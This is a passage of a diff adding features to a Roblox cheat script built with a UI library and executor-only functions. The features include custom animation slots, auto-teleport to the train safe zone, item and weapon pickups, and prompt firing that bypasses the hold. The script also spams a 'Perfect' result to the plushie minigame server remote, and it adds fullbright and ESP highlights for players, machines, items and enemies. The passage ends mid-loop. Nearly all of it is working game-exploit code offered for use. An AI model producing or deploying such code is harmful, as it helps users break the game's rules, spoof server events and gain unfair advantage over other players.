+local RUN_SPEED_THRESHOLD = 12       -- tune to match game's run speed
+local POLL_INTERVAL = 0.08
+local PREVIEW_DURATION = 2
+local EMOTE_AUTO_STOP = 6
+local JUMP_VERTICAL_THRESHOLD = 2    -- vertical velocity to consider as jump
+local FALL_VERTICAL_THRESHOLD = -6   -- vertical velocity to consider as falling
+
+-- Slots
+local slotNames = { "Idle", "Walk", "Run", "Jump", "Fall", "Swim", "Climb", "Emote" }
+
+-- State
+local inputs = {}
+local assignedSlots = {}
+local assignedAnimIds = {}
+local activeTracks = {}
+
+for _, s in ipairs(slotNames) do
+    inputs[s] = ""
+    assignedSlots[s] = false
+    assignedAnimIds[s] = nil
+    activeTracks[s] = nil
+end
+
+-- Priority mapping
+local PRIORITY_MAP = {
+    Idle  = Enum.AnimationPriority.Idle,
+    Walk  = Enum.AnimationPriority.Movement,
+    Run   = Enum.AnimationPriority.Movement,
+    Swim  = Enum.AnimationPriority.Movement,
+    Climb = Enum.AnimationPriority.Movement,
+    Jump  = Enum.AnimationPriority.Action,
+    Fall  = Enum.AnimationPriority.Action,
+    Emote = Enum.AnimationPriority.Action
+}
+
+-- Helpers
+local function log(...)
+    local t = {}
+    for i = 1, select("#", ...) do t[i] = tostring(select(i, ...)) end
+    print("[PlayerTab][Anim] " .. table.concat(t, " "))
+end
+
+local function normalizeId(input)
+    if not input then return nil end
+    input = tostring(input):match("^%s*(.-)%s*$")
+    local id = input:match("rbxassetid://(%d+)") or input:match("library/(%d+)") or input:match("(%d+)")
+    if id and tonumber(id) then
+        return "rbxassetid://" .. id
+    end
+    return nil
+end
+
+local function getAnimatorForCharacter(char)
+    if not char then return nil, nil end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        local animator = humanoid:FindFirstChildOfClass("Animator")
+        if not animator then
+            animator = Instance.new("Animator")
+            animator.Parent = humanoid
+        end
+        return animator, humanoid
+    end
+    local controller = char:FindFirstChildOfClass("AnimationController")
+    if controller then
+        local animator = controller:FindFirstChildOfClass("Animator")
+        if not animator then
+            animator = Instance.new("Animator")
+            animator.Parent = controller
+        end
+        return animator, nil
+    end
+    local ok, ac = pcall(function()
+        local new = Instance.new("AnimationController")
+        new.Name = "TZ_AnimController"
+        new.Parent = char
+        local anim = Instance.new("Animator")
+        anim.Parent = new
+        return new
+    end)
+    if ok and ac then
+        return ac:FindFirstChildOfClass("Animator"), nil
+    end
+    return nil, nil
+end
+
+local function createAnimationInstance(animId, slotName)
+    local ok, anim = pcall(function()
+        local a = Instance.new("Animation")
+        a.Name = ("TZ_%s_%s"):format(slotName, tostring(os.time()))
+        a.AnimationId = animId
+        return a
+    end)
+    if ok and anim then return anim end
+    return nil
+end
+
+local function stopTrack(slot)
+    if activeTracks[slot] then
+        pcall(function() activeTracks[slot]:Stop() end)
+        activeTracks[slot] = nil
+    end
+end
+
+local function stopPlayingByPriority(animator, priority)
+    if not animator then return end
+    for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+        pcall(function()
+            if track and track.Priority == priority then
+                track:Stop()
+            end
+        end)
+    end
+end
+
+-- Play a slot's animation: stops same-priority playing tracks first
+local function playSlot(slotName, loop)
+    local char = LocalPlayer.Character
+    if not char then return false, "No character" end
+    local animId = assignedAnimIds[slotName]
+    if not animId then return false, "No animation assigned" end
+
+    local animator, humanoid = getAnimatorForCharacter(char)
+    if not animator then return false, "No animator" end
+
+    -- Stop any previous track we started for this slot
+    stopTrack(slotName)
+
+    -- Stop other playing tracks that belong to the same priority
+    local priority = PRIORITY_MAP[slotName] or Enum.AnimationPriority.Action
+    pcall(function() stopPlayingByPriority(animator, priority) end)
+
+    -- Create and load the new animation
+    local anim = createAnimationInstance(animId, slotName)
+    if not anim then return false, "Failed to create animation instance" end
+
+    local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
+    if not ok or not track then return false, "Failed to load track" end
+
+    pcall(function()
+        track.Looped = loop and true or false
+        track.Priority = priority
+        track:Play()
+    end)
+
+    activeTracks[slotName] = track
+    return true
+end
+
+-- Assign but DO NOT play immediately
+local function assignSlot(slotName, animInput)
+    local id = normalizeId(animInput)
+    if not id then
+        assignedSlots[slotName] = false
+        assignedAnimIds[slotName] = nil
+        return false, "Invalid id"
+    end
+    assignedSlots[slotName] = true
+    assignedAnimIds[slotName] = id
+    return true
+end
+
+local function clearSlot(slotName)
+    assignedSlots[slotName] = false
+    assignedAnimIds[slotName] = nil
+    stopTrack(slotName)
+end
+
+local function getMovementSpeed()
+    local char = LocalPlayer.Character
+    if not char then return 0 end
+    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+    if hrp then
+        return hrp.AssemblyLinearVelocity.Magnitude
+    end
+    return 0
+end
+
+local function getVerticalVelocity()
+    local char = LocalPlayer.Character
+    if not char then return 0 end
+    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+    if hrp then
+        return hrp.AssemblyLinearVelocity.Y
+    end
+    return 0
+end
+
+local function getHumanoidState(humanoid)
+    if not humanoid then return nil end
+    return humanoid:GetState()
+end
+
+-- State machine: Idle, Walk, Run, Jump, Fall, Swim, Climb
+local currentState = "Idle"
+local lastJumpTick = 0
+
+task.spawn(function()
+    while true do
+        local char = LocalPlayer.Character
+        local animator, humanoid = nil, nil
+        if char then
+            animator, humanoid = getAnimatorForCharacter(char)
+        end
+
+        local speed = getMovementSpeed()
+        local vy = getVerticalVelocity()
+        local newState = "Idle"
+
+        -- Humanoid states if available
+        if humanoid then
+            local hs = getHumanoidState(humanoid)
+            if hs == Enum.HumanoidStateType.Swimming then
+                newState = "Swim"
+            elseif hs == Enum.HumanoidStateType.Climbing then
+                newState = "Climb"
+            elseif hs == Enum.HumanoidStateType.Jumping then
+                newState = "Jump"
+            elseif hs == Enum.HumanoidStateType.Freefall then
+                newState = "Fall"
+            else
+                -- movement-based
+                if speed > RUN_SPEED_THRESHOLD then
+                    newState = "Run"
+                elseif speed > WALK_SPEED_THRESHOLD then
+                    newState = "Walk"
+                else
+                    newState = "Idle"
+                end
+            end
+        else
+            -- Fallback detection for custom rigs
+            if vy > JUMP_VERTICAL_THRESHOLD and (tick() - lastJumpTick) > 0.2 then
+                newState = "Jump"
+                lastJumpTick = tick()
+            elseif vy < FALL_VERTICAL_THRESHOLD then
+                newState = "Fall"
+            elseif speed > RUN_SPEED_THRESHOLD then
+                newState = "Run"
+            elseif speed > WALK_SPEED_THRESHOLD then
+                newState = "Walk"
+            else
+                newState = "Idle"
+            end
+        end
+
+        if newState ~= currentState then
+            -- stop tracks for previous state and start for new state if assigned
+            -- stop all movement/action tracks that conflict
+            if currentState and assignedSlots[currentState] then
+                stopTrack(currentState)
+            end
+
+            -- Start new state's animation if assigned
+            if assignedSlots[newState] and assignedAnimIds[newState] then
+                pcall(function() playSlot(newState, (newState ~= "Jump" and newState ~= "Fall" and newState ~= "Emote")) end)
+            end
+
+            currentState = newState
+        end
+
+        -- Ensure assigned animations are playing if they should be
+        if currentState and assignedSlots[currentState] and assignedAnimIds[currentState] and not activeTracks[currentState] then
+            pcall(function() playSlot(currentState, (currentState ~= "Jump" and currentState ~= "Fall" and currentState ~= "Emote")) end)
+        end
+
+        task.wait(POLL_INTERVAL)
+    end
+end)
+
+-- Emote: play once on demand and auto-stop
+local function playEmoteOnce()
+    if not assignedSlots.Emote or not assignedAnimIds.Emote then
+        return false, "No emote assigned"
+    end
+    local ok, res = pcall(function() return playSlot("Emote", false) end)
+    if not ok then return false, res end
+    task.delay(EMOTE_AUTO_STOP, function() stopTrack("Emote") end)
+    return true
+end
+
+-- Reapply assignments after respawn (do not auto-play; state machine will handle)
+LocalPlayer.CharacterAdded:Connect(function()
+    for k,_ in pairs(activeTracks) do stopTrack(k) end
+    task.wait(0.6)
+end)
+
+-- UI: create controls for each slot
+local function makeSlotControls(slotName)
+    PlayerTab:Input({
+        Title = slotName .. " Animation Id or URL",
+        Placeholder = "e.g. 123456789 or https://www.roblox.com/library/123456789/Name",
+        Default = "",
+        Callback = function(text)
+            inputs[slotName] = text or ""
+        end,
+        Store = function() end
+    })
+
+    PlayerTab:Button({
+        Title = "Check " .. slotName .. " Animation",
+        Desc = "Preview the entered " .. slotName .. " animation for " .. PREVIEW_DURATION .. "s",
+        Callback = function()
+            local id = normalizeId(inputs[slotName])
+            if not id then
+                warn("[PlayerTab] Invalid animation id for " .. slotName)
+                return
+            end
+            local char = LocalPlayer.Character
+            if not char then warn("[PlayerTab] Character not found for preview") return end
+            local animator = getAnimatorForCharacter(char)
+            if not animator then warn("[PlayerTab] Animator not available for preview") return end
+            local anim = createAnimationInstance(id, slotName .. "_Preview")
+            if not anim then warn("[PlayerTab] Failed to create preview animation") return end
+            local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
+            if not ok or not track then warn("[PlayerTab] Failed to load preview track") return end
+            pcall(function() track.Looped = false; track:Play() end)
+            task.delay(PREVIEW_DURATION, function() pcall(function() track:Stop() end) end)
+        end
+    })
+
+    PlayerTab:Toggle({
+        Title = "Use " .. slotName .. " Animation",
+        Desc = "Assign the entered animation for " .. slotName .. " (does not auto-play)",
+        Default = false,
+        Callback = function(state)
+            if state then
+                local ok, err = assignSlot(slotName, inputs[slotName])
+                if not ok then
+                    warn("[PlayerTab] Failed to assign for slot", slotName, err)
+                    assignedSlots[slotName] = false
+                else
+                    log("Assigned", slotName, assignedAnimIds[slotName])
+                end
+            else
+                clearSlot(slotName)
+                log("Cleared assignment for", slotName)
+            end
+        end
+    })
+end
+
+for _, s in ipairs(slotNames) do
+    makeSlotControls(s)
+end
+
+PlayerTab:Button({
+    Title = "Play Emote Now",
+    Desc = "Plays the assigned Emote once",
+    Callback = function()
+        local ok, err = playEmoteOnce()
+        if not ok then warn("[PlayerTab] Emote play failed:", err) end
+    end
+})
+
+PlayerTab:Button({
+    Title = "Stop All Animations",
+    Desc = "Stops tracks started by this UI and clears assignments",
+    Callback = function()
+        for _, slot in ipairs(slotNames) do
+            clearSlot(slot)
+        end
+        for k,_ in pairs(activeTracks) do
+            if activeTracks[k] then
+                pcall(function() activeTracks[k]:Stop() end)
+                activeTracks[k] = nil
+            end
+        end
+        log("All animation slots cleared and stopped.")
+    end
+})
+
+log("Expanded animation slots loaded. Use inputs to set IDs, toggles to assign, and Play Emote to trigger emote.")
+
+
+-- ===== Auto Teleport to Train (robust replacement) =====
+local autoElevator = false
+local autoElevatorThread = nil
+
+-- helper: find TrainSafeZone safely
+local function findTrainSafeZone()
+    local ok, zone = pcall(function()
+        local p = workspace:FindFirstChild("Persistent")
+        if not p then return nil end
+        local zones = p:FindFirstChild("Zones")
+        if not zones then return nil end
+        return zones:FindFirstChild("TrainSafeZone")
+    end)
+    return ok and zone or nil
+end
+
+-- helper: teleport with cooperative lock, retries, and verification
+local function teleportToTrainSafeZone(hrp, attempts)
+    attempts = attempts or 2
+    hrp = hrp or (safeGetHRP and safeGetHRP()) or (game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+    if not hrp then dbg("teleportToTrainSafeZone: no HRP"); return false end
+    if noclipEnabled then dbg("teleportToTrainSafeZone: noclip active; skipping"); return false end
+
+    if acquireLock then
+        if not acquireLock("teleport", 3) then
+            dbg("teleportToTrainSafeZone: failed to acquire teleport lock")
+            return false
+        end
+    end
+
+    local zone = findTrainSafeZone()
+    if not zone then
+        dbg("teleportToTrainSafeZone: TrainSafeZone not found")
+        if releaseLock then pcall(function() releaseLock("teleport") end) end
+        return false
+    end
+
+    local success = false
+    for i = 1, attempts do
+        local offset = Vector3.new(0, 5 + (i-1)*1.5, 0)
+        local target = zone.CFrame + offset
+        local ok, err = pcall(function() hrp.CFrame = target end)
+        if ok then
+            task.wait(0.18)
+            local movedOk, dist = pcall(function() return (hrp.Position - target.Position).Magnitude end)
+            if movedOk and dist and dist < 2.5 then
+                success = true
+                break
+            end
+        else
+            dbg("teleportToTrainSafeZone: teleport pcall failed: "..tostring(err))
+        end
+        task.wait(0.18 + i*0.06)
+    end
+
+    if releaseLock then pcall(function() releaseLock("teleport") end) end
+    if success then dbg("teleportToTrainSafeZone: success") else dbg("teleportToTrainSafeZone: failed after attempts") end
+    return success
+end
+
+-- wrapper used by the loop
+local function autoTrainSafeZoneSafe(hrp)
+    hrp = hrp or (safeGetHRP and safeGetHRP())
+    if not hrp then return end
+    if not teleportToTrainSafeZone(hrp, 1) then
+        pcall(function() hrp.AssemblyLinearVelocity = Vector3.new(0,0,0) end)
+        task.wait(0.12)
+        teleportToTrainSafeZone(hrp, 2)
+    end
+end
+
+-- main loop thread
+local function autoElevatorLoop()
+    while autoElevator do
+        task.wait(1)
+
+        local interacts = workspace:FindFirstChild("Interacts")
+        if not interacts then
+            dbg("autoElevator: Interacts folder missing; stopping")
+            autoElevator = false
+            break
+        end
+
+        local machines = interacts:GetChildren()
+        local allCleared = true
+        for _, machine in ipairs(machines) do
+            local vfx = machine:FindFirstChild("VFX")
+            if vfx and #vfx:GetChildren() > 0 then
+                allCleared = false
+                break
+            end
+        end
+
+        if allCleared and #machines > 0 then
+            local plr = game:GetService("Players").LocalPlayer
+            local char = plr and (plr.Character or plr.CharacterAdded:Wait())
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                autoTrainSafeZoneSafe(hrp)
+            end
+        end
+    end
+    autoElevatorThread = nil
+end
+
+-- UI toggle (replace existing TeleportSection:Toggle block)
+TeleportSection:Toggle({
+    Title = "Auto teleport to train",
+    Flag = "auto_elevator_toggle",
+    Value = false,
+    Callback = function(state)
+        autoElevator = state
+        if autoElevator then
+            if autoElevatorThread then return end
+            autoElevatorThread = task.spawn(autoElevatorLoop)
+            dbg("autoElevator: started")
+        else
+            autoElevator = false
+            if autoElevatorThread then
+                -- allow loop to exit gracefully
+                task.spawn(function()
+                    local t0 = tick()
+                    while autoElevatorThread and (tick() - t0) < 1.2 do task.wait(0.05) end
+                    autoElevatorThread = nil
+                end)
+            end
+            dbg("autoElevator: stopped")
+        end
+    end
+})
+-- ===== end Auto Teleport to Train replacement =====
+--// Teleport to Item Button (no notify)
+MainTab:Button({
+    Title = "Teleport to item",
+    Flag = "teleport_item_button",
+    Icon = "solar:cursor-square-bold",
+    Callback = function()
+        local stuffingFolder = workspace:FindFirstChild("Pickup") and workspace.Pickup:FindFirstChild("Stuffing")
+        if stuffingFolder then
+            local items = stuffingFolder:GetChildren()
+            if #items > 0 then
+                local item = items[1]
+                local player = game.Players.LocalPlayer
+                local char = player.Character or player.CharacterAdded:Wait()
+                local hrp = char:WaitForChild("HumanoidRootPart")
+
+                if item:IsA("Model") then
+                    local cf, size = item:GetBoundingBox()
+                    hrp.CFrame = cf + Vector3.new(0, size.Y/2 + 5, 0)
+                elseif item:IsA("BasePart") then
+                    hrp.CFrame = item.CFrame + Vector3.new(0, item.Size.Y/2 + 5, 0)
+                end
+
+                -- Fire its ProximityPrompt if exists
+                local prompt = item:FindFirstChild("Main") and item.Main:FindFirstChildOfClass("ProximityPrompt")
+                if prompt then
+                    fireproximityprompt(prompt, 0) -- bypass Hold
+                end
+            end
+        end
+    end
+})
+
+
+--// Teleport to Weapons Button
+TeleportSection:Button({
+    Title = "Teleport to weapons",
+    Flag = "teleport_weapons_button",
+    Icon = "solar:cursor-square-bold",
+    Callback = function()
+        local vfxFolder = workspace:FindFirstChild("VFX")
+        if vfxFolder then
+            local items = vfxFolder:GetChildren()
+            if #items > 0 then
+                local item = items[1]
+                local player = game.Players.LocalPlayer
+                local char = player.Character or player.CharacterAdded:Wait()
+                local hrp = char:WaitForChild("HumanoidRootPart")
+
+                -- Teleport slightly above item
+                if item:IsA("Model") then
+                    local cf, size = item:GetBoundingBox()
+                    hrp.CFrame = cf + Vector3.new(0, size.Y/2 + 3, 0)
+                elseif item:IsA("BasePart") then
+                    hrp.CFrame = item.CFrame + Vector3.new(0, item.Size.Y/2 + 3, 0)
+                end
+
+                -- Fire any ProximityPrompt inside
+                local prompt = item:FindFirstChildWhichIsA("ProximityPrompt", true)
+                if prompt then
+                    fireproximityprompt(prompt, 0) -- bypass Hold instantly
+                end
+            end
+        end
+    end
+})
+
+local autoWeapons = false
+
+TeleportSection:Toggle({
+    Title = "Auto teleport to weapons",
+    Flag = "auto_weapons_toggle",
+    Value = false,
+    Callback = function(state)
+        autoWeapons = state
+        if autoWeapons then
+            task.spawn(function()
+                while autoWeapons do
+                    task.wait(0.5)
+
+                    local vfxFolder = workspace:FindFirstChild("VFX")
+                    if vfxFolder then
+                        for _, item in pairs(vfxFolder:GetChildren()) do
+                            local player = game.Players.LocalPlayer
+                            local char = player.Character or player.CharacterAdded:Wait()
+                            local hrp = char:FindFirstChild("HumanoidRootPart")
+                            if not hrp then continue end
+
+                            -- Teleport slightly above item
+                            if item:IsA("Model") then
+                                local cf, size = item:GetBoundingBox()
+                                hrp.CFrame = cf + Vector3.new(0, size.Y/2 + 3, 0)
+                            elseif item:IsA("BasePart") then
+                                hrp.CFrame = item.CFrame + Vector3.new(0, item.Size.Y/2 + 3, 0)
+                            end
+
+                            -- Loop firing prompts until item disappears
+                            while autoWeapons and item.Parent == vfxFolder do
+                                for _, prompt in ipairs(item:GetDescendants()) do
+                                    if prompt:IsA("ProximityPrompt") then
+                                        pcall(function()
+                                            fireproximityprompt(prompt, 0)
+                                        end)
+                                    end
+                                end
+                                task.wait(0.2)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+-- Plushie minigame auto-fire toggle with GUI visibility control
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+local plushGui = playerGui:WaitForChild("Main"):WaitForChild("PlushieMinigame")
+
+local rs = ReplicatedStorage
+local remote = rs:WaitForChild("Remotes"):WaitForChild("PlushieMinigame")
+
+-- state
+local autoPlushFire = false
+local autoPlushThread = nil
+
+local function startAutoPlush()
+    if autoPlushFire then return end
+    autoPlushFire = true
+
+    -- hide GUI
+    if plushGui then
+        plushGui.Visible = false
+    end
+
+    if autoPlushThread then return end
+    autoPlushThread = task.spawn(function()
+        while autoPlushFire do
+            pcall(function()
+                if remote and remote.FireServer then
+                    remote:FireServer("Perfect")
+                end
+            end)
+            task.wait(0.01)
+        end
+        autoPlushThread = nil
+    end)
+end
+
+local function stopAutoPlush()
+    autoPlushFire = false
+
+    -- restore GUI visibility
+    if plushGui then
+        plushGui.Visible = true
+    end
+
+    autoPlushThread = nil
+end
+
+-- UI toggle
+MainTab:Toggle({
+    Title = "Auto Skillcheck",
+    Desc = "Instantly completes the skillcheck",
+    Flag = "auto_plush_perfect_toggle",
+    Value = false,
+    Callback = function(state)
+        if state then
+            startAutoPlush()
+        else
+            stopAutoPlush()
+        end
+    end,
+})
+
+--// Visual Tab
+local VisualTab = Window:Tab({
+    Title = "Visual",
+    Icon = "solar:eye-bold",
+})
+
+local VisualSection = VisualTab:Section({
+    Title = "Visual Enhancements",
+    Box = false,
+    TextTransparency = 0.05,
+    TextXAlignment = "Left",
+    TextSize = 17,
+    Opened = true,
+})
+
+-- === FullBright toggle ===
+local fullBrightEnabled = false
+local function enableFullBright()
+    if fullBrightEnabled then return end
+    local Lighting = game:GetService("Lighting")
+    _FB_backup = {
+        Brightness = Lighting.Brightness,
+        Ambient = Lighting.Ambient,
+        OutdoorAmbient = Lighting.OutdoorAmbient,
+        ClockTime = Lighting.ClockTime,
+        GlobalShadows = Lighting.GlobalShadows,
+    }
+    Lighting.Brightness = 2
+    Lighting.Ambient = Color3.fromRGB(255,255,255)
+    Lighting.OutdoorAmbient = Color3.fromRGB(255,255,255)
+    Lighting.GlobalShadows = false
+    fullBrightEnabled = true
+    dbg("FullBright enabled")
+end
+
+local function disableFullBright()
+    if not fullBrightEnabled then return end
+    local Lighting = game:GetService("Lighting")
+    if _FB_backup then
+        Lighting.Brightness = _FB_backup.Brightness
+        Lighting.Ambient = _FB_backup.Ambient
+        Lighting.OutdoorAmbient = _FB_backup.OutdoorAmbient
+        Lighting.ClockTime = _FB_backup.ClockTime
+        Lighting.GlobalShadows = _FB_backup.GlobalShadows
+    end
+    _FB_backup = nil
+    fullBrightEnabled = false
+    dbg("FullBright disabled")
+end
+
+
+-- Shared ESP color
+local espColor = Color3.fromRGB(0, 255, 0)
+local espEnabled = false
+
+-- Function to apply highlights
+local function applyHighlights()
+    for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+        if plr ~= game.Players.LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            local existing = plr.Character:FindFirstChild("ESPHighlight")
+            if not existing then
+                local highlight = Instance.new("Highlight")
+                highlight.Name = "ESPHighlight"
+                highlight.FillColor = espColor
+                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                highlight.Parent = plr.Character
+            else
+                existing.FillColor = espColor
+            end
+        end
+    end
+end
+
+-- ESP Toggle
+VisualSection:Toggle({
+    Title = "Highlight Players",
+    Flag = "esp_toggle",
+    Value = false,
+    Callback = function(state)
+        espEnabled = state
+        if state then
+            task.spawn(function()
+                while espEnabled do
+                    applyHighlights()
+                    task.wait(1) -- update every second
+                end
+                -- cleanup when disabled
+                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+                    if plr.Character and plr.Character:FindFirstChild("ESPHighlight") then
+                        plr.Character.ESPHighlight:Destroy()
+                    end
+                end
+            end)
+        end
+    end
+})
+
+
+
+-- Colorpicker linked to ESP
+VisualSection:Colorpicker({
+    Title = "Character Color",
+    Desc = "Change highlight color for ESP",
+    Default = espColor,
+    Callback = function(color)
+        espColor = color
+        -- update all highlights instantly
+        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+            if plr.Character and plr.Character:FindFirstChild("ESPHighlight") then
+                plr.Character.ESPHighlight.FillColor = espColor
+            end
+        end
+    end
+})
+--// Highlight Machine Toggle
+local autoHighlight = false
+
+VisualSection:Toggle({
+    Title = "Highlight Machines",
+    Desc = "even the game will break it 😭",
+    Flag = "highlight_machine_toggle",
+    Value = false,
+    Callback = function(state)
+        autoHighlight = state
+        if autoHighlight then
+            task.spawn(function()
+                while autoHighlight do
+                    task.wait(1)
+
+                    local interacts = workspace:FindFirstChild("Interacts")
+                    if interacts then
+                        for _, machine in pairs(interacts:GetChildren()) do
+                            if machine:IsA("Model") or machine:IsA("BasePart") then
+                                -- Remove existing highlight
+                                local oldHighlight = machine:FindFirstChildOfClass("Highlight")
+                                if oldHighlight then
+                                    oldHighlight:Destroy()
+                                end
+
+                                -- Add our highlight
+                                local highlight = Instance.new("Highlight")
+                                highlight.Name = "AutoHighlight"
+                                highlight.FillColor = Color3.fromRGB(0, 255, 0) -- bright green
+                                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                                highlight.FillTransparency = 0.5
+                                highlight.OutlineTransparency = 0
+                                highlight.Parent = machine
+                            end
+                        end
+                    end
+                end
+            end)
+        else
+            -- Toggle OFF: remove all our highlights
+            local interacts = workspace:FindFirstChild("Interacts")
+            if interacts then
+                for _, machine in pairs(interacts:GetChildren()) do
+                    local oldHighlight = machine:FindFirstChild("AutoHighlight")
+                    if oldHighlight then
+                        oldHighlight:Destroy()
+                    end
+                end
+            end
+        end
+    end
+})
+-- FULLY FIXED HIGHLIGHT + BLACKLIST (WINDUI MULTI SUPPORT)
+
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+
+local localPlayer = Players.LocalPlayer
+
+getgenv().HighlightPickupItems = getgenv().HighlightPickupItems or false
+
+local activeHighlights = {}
+local blacklist = {}
+
+local function clearHighlights()
+    for raw, info in pairs(activeHighlights) do
+        pcall(function()
+            if info and info.highlight then
+                info.highlight:Destroy()
+            end
+        end)
+    end
+    activeHighlights = {}
+end
+
+local function createHighlightFor(rawInstance, adornee)
+    if not rawInstance or not adornee then return end
+    if activeHighlights[rawInstance] then return end
+
+    local h = Instance.new("Highlight")
+    h.Adornee = adornee
+    h.FillColor = Color3.fromRGB(0,170,255)
+    h.OutlineColor = Color3.fromRGB(255,255,255)
+    h.FillTransparency = 0.6
+    h.OutlineTransparency = 0
+    h.Parent = CoreGui
+
+    activeHighlights[rawInstance] = {
+        adornee = adornee,
+        highlight = h
+    }
+end
+
+local function normalizeName(name)
+    if not name then return "" end
+    local s = tostring(name)
+    s = s:gsub("[%z\1-\31\127\194-\244][\128-\191]*", "")
+    s = s:gsub("%W", "")
+    s = s:lower()
+    return s
+end
+
+local function isBlacklisted(rawName)
+    local norm = normalizeName(rawName)
+
+    for blockedName in pairs(blacklist) do
+        if norm == blockedName or norm:find(blockedName) then
+            return true
+        end
+    end
+
+    return false
+end
+
+local rawItemList = {
+    "StuffingSamples","EfficiencyFluff","SpeedFluff","StealthFluff","StaminaFluff",
+    "Banana","BrokenClock","RippedThread","FluffShield","HealingPatch",
+    "StickyBomb","RejectRadar","Compass","Stimulant","FluffKit",
+    "InstantCharger","PlushieTea","SecurityBlanket","TheBlueprint","StaticShock",
+    "SecondSpool","MagicClock","MegaKit","FactoryMold","DollysCaress",
+}
+
+local function collectFromContainer(container)
+    local results = {}
+    if not container then return results end
+
+    local function scan(obj)
+        if obj:IsA("Model") or obj:IsA("Folder") then
+            for _, child in ipairs(obj:GetChildren()) do
+                scan(child)
+            end
+        elseif obj:IsA("BasePart") then
+            table.insert(results, {raw = obj, adornee = obj})
+        else
+            local basePart = obj:FindFirstChildWhichIsA("BasePart", true)
+            if basePart then
+                table.insert(results, {raw = obj, adornee = basePart})
+            end
+        end
+    end
+
+    scan(container)
+    return results
+end
+
+local function findAllItems()
+    local out = {}
+    local seen = {}
+
+    local function add(container)
+        for _, e in ipairs(collectFromContainer(container)) do
+            local key = tostring(e.raw)
+            if not seen[key] then
+                seen[key] = true
+                table.insert(out, e)
+            end
+        end
+    end
+
+    add(workspace:FindFirstChild("Pickup"))
+    add(workspace:FindFirstChild("Tools"))
+
+    for _, child in ipairs(workspace:GetChildren()) do
+        if child:IsA("Folder") and child.Name:lower():find("zone") then
+            add(child)
+        end
+    end
+
+    return out
+end
+
+local function runHighlightLoop()
+    while getgenv().HighlightPickupItems do
+        local items = findAllItems()
+
+        for _, entry in ipairs(items) do
+            local raw = entry.raw
+            local adornee = entry.adornee
+
+            if raw and adornee and adornee.Parent then
+                if not isBlacklisted(raw.Name) then
+                    createHighlightFor(raw, adornee)
+                end
+            end
+        end
+
+        for raw, info in pairs(activeHighlights) do
+            local keep = false
+
+            if raw and raw.Parent and info.adornee and info.adornee.Parent then
+                if not isBlacklisted(raw.Name) then
+                    keep = true
+                end
+            end
+
+            if not keep then
+                pcall(function()
+                    if info.highlight then
+                        info.highlight:Destroy()
+                    end
+                end)
+                activeHighlights[raw] = nil
+            end
+        end
+
+        task.wait(0.5)
+    end
+
+    clearHighlights()
+end
+
+local function startHighlighting()
+    if getgenv().HighlightPickupItems then return end
+    getgenv().HighlightPickupItems = true
+    task.spawn(runHighlightLoop)
+end
+
+local function stopHighlighting()
+    getgenv().HighlightPickupItems = false
+    clearHighlights()
+end
+
+local function rebuildBlacklistFromSelection(selection)
+    blacklist = {}
+
+    if not selection then return end
+
+    for _, v in pairs(selection) do
+        local name
+
+        if type(v) == "table" then
+            name = v.Title or v.Name
+        else
+            name = v
+        end
+
+        if name then
+            local norm = normalizeName(name)
+            if norm ~= "" then
+                blacklist[norm] = true
+            end
+        end
+    end
+end
+
+local function buildDropdownValues()
+    local t = {}
+    for _, v in ipairs(rawItemList) do
+        table.insert(t, v)
+    end
+    table.sort(t)
+    return t
+end
+
+local HighlightBlacklistDropdown = VisualSection:Dropdown({
+    Title = "Highlight blacklist",
+    Values = buildDropdownValues(),
+    Value = {},
+    Multi = true,
+    AllowNone = true,
+    SearchBarEnabled = true,
+
+    Callback = function(option)
+        rebuildBlacklistFromSelection(option)
+
+        for raw, info in pairs(activeHighlights) do
+            if raw and isBlacklisted(raw.Name) then
+                pcall(function()
+                    if info.highlight then
+                        info.highlight:Destroy()
+                    end
+                end)
+                activeHighlights[raw] = nil
+            end
+        end
+    end,
+})
+
+VisualSection:Toggle({
+    Title = "Highlight items",
+    Value = getgenv().HighlightPickupItems,
+
+    Callback = function(state)
+        if state then
+            startHighlighting()
+        else
+            stopHighlighting()
+        end
+    end,
+})
+-- Highlight everything under workspace.Enemies
+-- Attach this after your WindUI setup where VisualSection and MainTab exist.
+
+local enemiesFolder = workspace:WaitForChild("Enemies")
+local highlights = {}
+local running = false
+
+VisualSection:Toggle({
+    Title = "Highlight Enemies",
+    Desc = "",
+    Icon = "eye",
+    Value = false,
+    Callback = function(state)
+        running = state
+
+        if state then
+            task.spawn(function()
+                while running do
+                    
+                    -- re-find folder if it was replaced (new floor)
+                    if not enemiesFolder or not enemiesFolder.Parent then
+                        enemiesFolder = workspace:WaitForChild("Enemies")
+                    end
+
+                    local enemies = enemiesFolder:GetChildren()
+
+                    -- New floor detection
+                    if #enemies == 0 then
+                        print("New floor detected")
+
+                        for enemy, hl in pairs(highlights) do
+                            if hl then
+                                hl:Destroy()
+                            end
+                            highlights[enemy] = nil
+                        end
+                    end
+
+                    -- scan enemies
+                    for _, enemy in ipairs(enemies) do
+                        if enemy and enemy.Parent and not highlights[enemy] then
+                            
+                            local hl = Instance.new("Highlight")
+                            hl.Name = "EnemyHighlight"
+                            hl.FillColor = Color3.fromRGB(255,0,0)
+                            hl.OutlineColor = Color3.fromRGB(255,255,255)
+                            hl.FillTransparency = 0.5
+                            hl.OutlineTransparency = 0
+                            hl.Parent = enemy
+
+                            highlights[enemy] = hl
+                        end
+                    end
+
+                    -- remove highlights if enemy deleted
+                    for enemy, hl in pairs(highlights) do
